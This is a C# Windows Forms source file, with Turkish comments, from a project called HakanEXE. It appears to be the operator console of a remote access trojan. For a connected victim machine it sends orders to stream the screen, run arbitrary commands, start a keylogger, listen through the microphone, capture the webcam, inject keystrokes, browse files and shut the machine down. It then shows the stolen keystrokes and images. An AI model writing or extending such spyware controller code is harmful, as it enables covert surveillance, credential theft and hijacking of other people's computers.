using System;
using System.Windows.Forms;
using HakanEXE.Server.Core;
using HakanEXE.Server.Models;
using System.Drawing;
using System.IO;

namespace HakanEXE.Server.Forms
{
    public partial class ClientDetailForm : Form
    {
        private ClientInfo _client;
        private ServerManager _serverManager;
        private Timer _screenRefreshTimer;
        // txtCommandOutput, pbLiveScreen gibi kontroller Designer.cs dosyasında tanımlıdır.

        public ClientDetailForm(ClientInfo client, ServerManager serverManager)
        {
            InitializeComponent();
            _client = client;
            _serverManager = serverManager;
            this.Text = $"HakanEXE - {_client.ComputerName} ({_client.IpAddress}) - AgentID: {_client.AgentId}";

            _serverManager.PacketReceived += ServerManager_PacketReceived_ForDetailForm; // Abone ol

            InitializeLiveScreen();
            InitializeFileExplorer();
            // InitializeCommandLine(); // Tasarımcıda txtCommandText, btnExecuteCommand, txtCommandOutput var
            // InitializeKeylogger();   // Tasarımcıda txtKeyloggerOutput var
            // InitializeSystemInfo();  // Tasarımcıda lblSystemInfo var
        }

        private void InitializeLiveScreen()
        {
            pbLiveScreen.SizeMode = PictureBoxSizeMode.Zoom;
            _screenRefreshTimer = new Timer();
            _screenRefreshTimer.Interval = 2000;
            _screenRefreshTimer.Tick += ScreenRefreshTimer_Tick;
        }

        private void InitializeFileExplorer()
        {
            txtCurrentPath.Text = "C:\\";
        }

        private void ScreenRefreshTimer_Tick(object sender, EventArgs e)
        {
            if (_client != null && _serverManager != null)
            {
                _serverManager.SendCommand(_client.IpAddress, PacketType.RequestScreenshot, "");
            }
        }

        private void BtnStartLiveScreen_Click(object sender, EventArgs e)
        {
            _screenRefreshTimer.Start();
            if (_client != null && _serverManager != null)
            {
                _serverManager.SendCommand(_client.IpAddress, PacketType.StartScreenStream, "");
            }
            MessageBox.Show("Canlı ekran görüntüsü başlatıldı.");
        }

        private void BtnStopLiveScreen_Click(object sender, EventArgs e)
        {
            _screenRefreshTimer.Stop();
            if (_client != null && _serverManager != null)
            {
                _serverManager.SendCommand(_client.IpAddress, PacketType.StopScreenStream, "");
            }
            pbLiveScreen.Image = null; // Ekranı temizle
            MessageBox.Show("Canlı ekran görüntüsü durduruldu.");
        }

        private void BtnShutdown_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show($"'{_client.ComputerName}' bilgisayarını kapatmak istediğinize emin misiniz?", "Kapatma Onayı", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes)
            {
                if (_client != null && _serverManager != null)
                {
                    _serverManager.SendCommand(_client.IpAddress, PacketType.Shutdown, "");
                }
            }
        }

        private void BtnRestart_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show($"'{_client.ComputerName}' bilgisayarını yeniden başlatmak istediğinize emin misiniz?", "Yeniden Başlatma Onayı", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes)
            {
                if (_client != null && _serverManager != null)
                {
                    _serverManager.SendCommand(_client.IpAddress, PacketType.Restart, "");
                }
            }
        }

        private void BtnExecuteCommand_Click(object sender, EventArgs e) // BU BUTON CMD KOMUTUNU GÖNDERİR
        {
            string command = txtCommandText.Text;
            if (!string.IsNullOrEmpty(command) && _client != null && _serverManager != null)
            {
                txtCommandOutput.AppendText($"[{DateTime.Now:HH:mm:ss}] Komut Gönderildi: {command}{Environment.NewLine}");
                _serverManager.SendCommand(_client.IpAddress, PacketType.ExecuteCommand, command);
                txtCommandText.Clear();
            }
            else if (string.IsNullOrEmpty(command))
            {
                MessageBox.Show("Lütfen çalıştırılacak bir komut girin.", "Uyarı", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
        }

        private void BtnOpenNotepad_Click(object sender, EventArgs e)
        {
            if (_client != null && _serverManager != null)
            {
                _serverManager.SendCommand(_client.IpAddress, PacketType.OpenNotepad, "");
            }
        }

        private void BtnGetSystemInfo_Click(object sender, EventArgs e)
        {
            if (_client != null && _serverManager != null)
            {
                _serverManager.SendCommand(_client.IpAddress, PacketType.RequestSystemInfo, "");
            }
        }

        // ---- BU METODU GÜNCELLİYORUZ ----
        private void ServerManager_PacketReceived_ForDetailForm(object sender, Packet packet)
        {
            // Sadece bu forma ait istemciden (AgentId veya IP ile kontrol edilebilir) gelen paketleri işle
            // _client.IpAddress yerine _client.AgentId kullanmak daha iyi olabilir eğer paketlerde AgentId varsa
            if (packet == null || _client == null || packet.SenderIp != _client.IpAddress)
                return;

            this.Invoke((MethodInvoker)delegate
            {
                txtCommandOutput.AppendText($"[{DateTime.Now:HH:mm:ss}] Paket Alındı: TİP={packet.PacketType}{Environment.NewLine}");
                switch (packet.PacketType)
                {
                    case PacketType.Screenshot:
                        try
                        {
                            byte[] imageBytes = Convert.FromBase64String(packet.Data);
                            using (MemoryStream ms = new MemoryStream(imageBytes))
                            {
                                pbLiveScreen.Image = Image.FromStream(ms);
                            }
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"Ekran görüntüsü hatası (ClientDetailForm): {ex.Message}");
                            pbLiveScreen.Image = null;
                            // txtCommandOutput.AppendText($"[{DateTime.Now:HH:mm:ss}] EKRAN GÖRÜNTÜSÜ HATASI: {ex.Message}{Environment.NewLine}");
                        }
                        break;

                    case PacketType.CommandOutput: // CMD KOMUT ÇIKTISI GELDİ
                        txtCommandOutput.AppendText($"[{DateTime.Now:HH:mm:ss}] Yanıt:\n{packet.Data}{Environment.NewLine}");
                        break;

                    case PacketType.SystemInfo:
                        // Sistem bilgisini lblSystemInfo'ya veya daha detaylı bir kontrole yazdır
                        // lblSystemInfo.Text = packet.Data; 
                        txtCommandOutput.AppendText($"[{DateTime.Now:HH:mm:ss}] Sistem Bilgisi:\n{packet.Data}{Environment.NewLine}");
                        break;
                    case PacketType.KeylogData:
                        txtKeyloggerOutput.AppendText(packet.Data);
                        break;
                    case PacketType.FileList:
                        // Dosya listesini lstFiles'a ekle
                        txtCommandOutput.AppendText($"[{DateTime.Now:HH:mm:ss}] Dosya Listesi:\n{packet.Data}{Environment.NewLine}");
                        break;
                    case PacketType.MicrophoneData:
                        txtCommandOutput.AppendText($"[{DateTime.Now:HH:mm:ss}] Mikrofon verisi alındı (işlenmiyor).{Environment.NewLine}");
                        break;
                    case PacketType.WebcamData:
                        try
                        {
                            byte[] imageBytes = Convert.FromBase64String(packet.Data);
                            using (MemoryStream ms = new MemoryStream(imageBytes))
                            {
                                pbWebcam.Image = Image.FromStream(ms); // pbWebcam Designer'da tanımlı olmalı
                            }
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"Webcam görüntüsü hatası (ClientDetailForm): {ex.Message}");
                            pbWebcam.Image = null;
                        }
                        break;
                }
            });
        }
        // ---- GÜNCELLEME BİTTİ ----

        private void ClientDetailForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (_serverManager != null)
            {
                _serverManager.PacketReceived -= ServerManager_PacketReceived_ForDetailForm; // Aboneliği kaldır
            }
            if (_screenRefreshTimer != null)
            {
                if (_screenRefreshTimer.Enabled)
                {
                    _screenRefreshTimer.Stop();
                    if (_client != null && _serverManager != null)
                    {
                        _serverManager.SendCommand(_client.IpAddress, PacketType.StopScreenStream, "");
                    }
                }
                _screenRefreshTimer.Dispose();
            }
        }

        // --- Diğer Butonların Olay Yöneticileri (Henüz implemente edilmedi ama butonlar Designer.cs'te var) ---
        private void BtnStartKeylogger_Click(object sender, EventArgs e)
        {
            if (_client != null && _serverManager != null)
            {
                _serverManager.SendCommand(_client.IpAddress, PacketType.StartKeylogger, "");
                MessageBox.Show("Keylogger başlatma isteği gönderildi.");
            }
        }

        private void BtnStopKeylogger_Click(object sender, EventArgs e)
        {
            if (_client != null && _serverManager != null)
            {
                _serverManager.SendCommand(_client.IpAddress, PacketType.StopKeylogger, "");
                MessageBox.Show("Keylogger durdurma isteği gönderildi.");
            }
        }

        private void BtnRefreshFiles_Click(object sender, EventArgs e)
        {
            if (_client != null && _serverManager != null && !string.IsNullOrEmpty(txtCurrentPath.Text))
            {
                _serverManager.SendCommand(_client.IpAddress, PacketType.RequestFileList, txtCurrentPath.Text);
                txtCommandOutput.AppendText($"[{DateTime.Now:HH:mm:ss}] Dosya listesi istendi: {txtCurrentPath.Text}{Environment.NewLine}");
            }
        }

        // Aşağıdaki olay yöneticileri Designer.cs dosyasında tanımlı kontrollere bağlı
        private void TabControlClient_SelectedIndexChanged(object sender, EventArgs e) { /* İleride kullanılabilir */ }
        private void LstFiles_DoubleClick(object sender, EventArgs e) { /* Dosya yöneticisi için */ }
        private void TxtCurrentPath_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (e.KeyChar == (char)Keys.Enter)
            {
                BtnRefreshFiles_Click(sender, e);
                e.Handled = true;
            }
        }
        private void BtnStartMicrophone_Click(object sender, EventArgs e) { if (_client != null && _serverManager != null) _serverManager.SendCommand(_client.IpAddress, PacketType.StartMicrophone, ""); MessageBox.Show("Mikrofon dinleme isteği gönderildi."); }
        private void BtnStopMicrophone_Click(object sender, EventArgs e) { if (_client != null && _serverManager != null) _serverManager.SendCommand(_client.IpAddress, PacketType.StopMicrophone, ""); MessageBox.Show("Mikrofon dinlemeyi durdurma isteği gönderildi."); }
        private void BtnStartWebcam_Click(object sender, EventArgs e) { if (_client != null && _serverManager != null) _serverManager.SendCommand(_client.IpAddress, PacketType.StartWebcam, ""); MessageBox.Show("Webcam başlatma isteği gönderildi."); }
        private void BtnStopWebcam_Click(object sender, EventArgs e) { if (_client != null && _serverManager != null) _serverManager.SendCommand(_client.IpAddress, PacketType.StopWebcam, ""); MessageBox.Show("Webcam durdurma isteği gönderildi."); }
        private void BtnMouseClick_Click(object sender, EventArgs e) { MessageBox.Show("Mouse tıklama özelliği eklenecek."); }
        private void BtnSendKeyboardInput_Click(object sender, EventArgs e) { if (!string.IsNullOrEmpty(txtKeyboardInput.Text) && _client != null && _serverManager != null) { _serverManager.SendCommand(_client.IpAddress, PacketType.KeyboardInput, txtKeyboardInput.Text); txtKeyboardInput.Clear(); MessageBox.Show("Klavye girişi gönderildi."); } }
        private void BtnDownloadFile_Click(object sender, EventArgs e) { MessageBox.Show("Dosya indirme özelliği eklenecek."); }
        private void BtnUploadFile_Click(object sender, EventArgs e) { MessageBox.Show("Dosya yükleme özelliği eklenecek."); }
        private void BtnDeleteFile_Click(object sender, EventArgs e) { MessageBox.Show("Dosya silme özelliği eklenecek."); }
    }
}